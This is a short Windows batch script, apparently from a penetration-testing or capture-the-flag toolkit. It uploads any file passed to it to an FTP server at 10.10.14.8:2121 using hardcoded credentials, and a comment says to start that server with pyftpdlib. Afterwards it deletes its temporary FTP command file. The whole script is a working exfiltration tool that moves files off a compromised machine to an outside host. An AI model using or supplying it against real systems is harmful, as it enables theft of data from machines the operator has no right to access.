:: start listening server with:
:: python3 -m pyftpdlib -w -u derp -P herpderp
@echo off
:: change server IP and Port as required
echo open 10.10.14.8 2121> ftpcmd.dat
echo user derp>> ftpcmd.dat
echo herpderp>> ftpcmd.dat
echo bin>> ftpcmd.dat
echo put %1>> ftpcmd.dat
echo quit>> ftpcmd.dat
ftp -n -s:ftpcmd.dat
del ftpcmd.dat
